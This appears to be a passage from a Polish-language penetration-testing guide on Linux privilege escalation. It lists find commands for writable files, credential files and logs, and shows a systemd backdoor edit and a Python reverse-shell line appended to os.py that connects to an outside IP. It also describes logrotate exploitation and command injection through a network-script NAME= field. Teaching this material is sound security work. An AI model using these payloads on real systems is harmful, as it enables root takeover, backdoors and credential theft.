Powinieneś sprawdzić, czy możesz **zapisywać w niektórych plikach wrażliwych**. Na przykład, czy możesz zapisać do jakiegoś **pliku konfiguracyjnego usługi**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na przykład, jeśli maszyna uruchamia serwer **tomcat** i możesz **zmodyfikować plik konfiguracji usługi Tomcat wewnątrz /etc/systemd/,** to możesz zmienić następujące linie:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Twój backdoor zostanie wykonany przy następnym uruchomieniu tomcat.

### Sprawdź katalogi

Następujące katalogi mogą zawierać kopie zapasowe lub interesujące informacje: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Prawdopodobnie nie będziesz w stanie odczytać ostatniego, ale spróbuj)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Dziwna lokalizacja/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Zmodyfikowane pliki w ostatnich minutach
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Pliki bazy danych Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml pliki
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Ukryte pliki
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skrypty / pliki binarne w PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Pliki webowe**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Kopie zapasowe**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Znane pliki zawierające hasła

Przeczytaj kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), przeszukuje on **wiele możliwych plików, które mogą zawierać hasła**.\
**Innym ciekawym narzędziem**, którego możesz użyć w tym celu, jest: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) które jest aplikacją open source służącą do odzyskiwania wielu haseł przechowywanych na lokalnym komputerze dla Windows, Linux & Mac.

### Logi

Jeśli możesz czytać logi, możesz znaleźć w nich **interesujące/poufne informacje**. Im dziwniejszy log, tym ciekawszy może być (prawdopodobnie).\
Również, niektóre "**bad**" skonfigurowane (backdoored?) **audit logs** mogą pozwolić ci **zarejestrować hasła** w audit logs jak wyjaśniono w tym wpisie: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Aby **czytać logi**, bardzo pomocna będzie grupa [**adm**](interesting-groups-linux-pe/index.html#adm-group).

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Powinieneś również sprawdzić pliki zawierające słowo "**password**" w **nazwie** lub w **treści**, a także sprawdzić występowanie IP i adresów e-mail w logach lub hashów przy użyciu regexps.\
Nie będę tu wypisywać, jak to wszystko zrobić, ale jeśli Cię to interesuje możesz sprawdzić ostatnie sprawdzenia, które wykonuje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Pliki zapisywalne

### Python library hijacking

Jeśli wiesz, **z jakiego miejsca** skrypt python będzie uruchamiany i możesz **zapisać w** tym folderze lub możesz **modyfikować python libraries**, możesz zmodyfikować bibliotekę OS i backdoor it (jeśli możesz zapisać tam, gdzie skrypt python będzie uruchamiany, skopiuj i wklej bibliotekę os.py).

Aby **backdoor the library** po prostu dodaj na końcu biblioteki os.py następującą linię (zmień IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Eksploatacja logrotate

Wrażliwość w `logrotate` pozwala użytkownikom z **uprawnieniami do zapisu** na plik logu lub jego katalogi nadrzędne potencjalnie uzyskać eskalację uprawnień. Dzieje się tak, ponieważ `logrotate`, często uruchamiany jako **root**, można zmanipulować, aby wykonywał dowolne pliki, szczególnie w katalogach takich jak _**/etc/bash_completion.d/**_. Ważne jest sprawdzenie uprawnień nie tylko w _/var/log_, ale też w każdym katalogu, gdzie stosowana jest rotacja logów.

> [!TIP]
> Ta podatność dotyczy wersji `logrotate` `3.18.0` i starszych

Bardziej szczegółowe informacje o podatności znajdują się tutaj: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Możesz eksploitować tę podatność za pomocą [**logrotten**](https://github.com/whotwagner/logrotten).

Ta podatność jest bardzo podobna do [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** więc zawsze, gdy możesz modyfikować logi, sprawdź, kto nimi zarządza i czy możesz eskalować uprawnienia, podstawiając logi przez symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Jeśli z jakiegoś powodu użytkownik jest w stanie **zapisać** skrypt `ifcf-<whatever>` do _/etc/sysconfig/network-scripts_ **lub** może **zmodyfikować** istniejący, to twój **system jest pwned**.

Network scripts, _ifcg-eth0_ na przykład, są używane do połączeń sieciowych. Wyglądają dokładnie jak pliki .INI. Jednak są one \~sourced\~ na Linuxie przez Network Manager (dispatcher.d).

W moim przypadku atrybut `NAME=` w tych network scripts nie jest obsługiwany prawidłowo. Jeśli masz **spację/znak odstępu w nazwie, system próbuje wykonać część po tej spacji**. To oznacza, że **wszystko po pierwszej spacji jest wykonywane jako root**.

Na przykład: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Zwróć uwagę na odstęp między Network a /bin/id_)

### **init, init.d, systemd i rc.d**

Katalog `/etc/init.d` zawiera **skrypty** dla System V init (SysVinit), **klasycznego systemu zarządzania usługami w Linuxie**. Zawiera skrypty do `start`, `stop`, `restart`, a czasami `reload` usług. Mogą być uruchamiane bezpośrednio lub przez dowiązania symboliczne znajdujące się w `/etc/rc?.d/`. Alternatywną ścieżką w systemach Redhat jest `/etc/rc.d/init.d`.

Z kolei `/etc/init` jest związany z **Upstart**, nowszym **systemem zarządzania usługami** wprowadzonym przez Ubuntu, wykorzystującym pliki konfiguracyjne do zarządzania usługami. Pomimo przejścia na Upstart, skrypty SysVinit nadal są używane obok konfiguracji Upstart z powodu warstwy kompatybilności w Upstart.

**systemd** pojawia się jako nowoczesny menedżer init i usług, oferujący zaawansowane funkcje takie jak uruchamianie daemonów na żądanie, zarządzanie automount oraz snapshoty stanu systemu. Organizuje pliki w `/usr/lib/systemd/` dla pakietów dystrybucji oraz `/etc/systemd/system/` dla modyfikacji administratora, upraszczając proces administracji systemu.

## Inne sztuczki

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Frameworki do rootowania Androida często hookują syscall, aby udostępnić uprzywilejowaną funkcjonalność jądra menedżerowi w userspace. Słaba autentykacja menedżera (np. sprawdzenia podpisu oparte na FD-order lub słabe schematy haseł) może pozwolić lokalnej aplikacji na podszycie się pod menedżera i eskalację do root na urządzeniach już zrootowanych. Dowiedz się więcej i zobacz szczegóły eksploatacji tutaj:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Odkrywanie usług oparte na Regex w VMware Tools/Aria Operations może wyciągnąć ścieżkę do binarki z linii poleceń procesu i uruchomić ją z parametrem -v w uprzywilejowanym kontekście. Permisywne wzorce (np. użycie \S) mogą dopasować podłożone przez atakującego nasłuchy w zapisywalnych lokalizacjach (np. /tmp/httpd), prowadząc do wykonania jako root (CWE-426 Untrusted Search Path).

Dowiedz się więcej i zobacz uogólniony wzorzec zastosowalny w innych stosach discovery/monitoringu tutaj:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Mechanizmy ochrony jądra

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Więcej pomocy

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Narzędzia Linux/Unix Privesc

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumeruje luki jądra w Linux i MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (dostęp fizyczny):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referencje

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
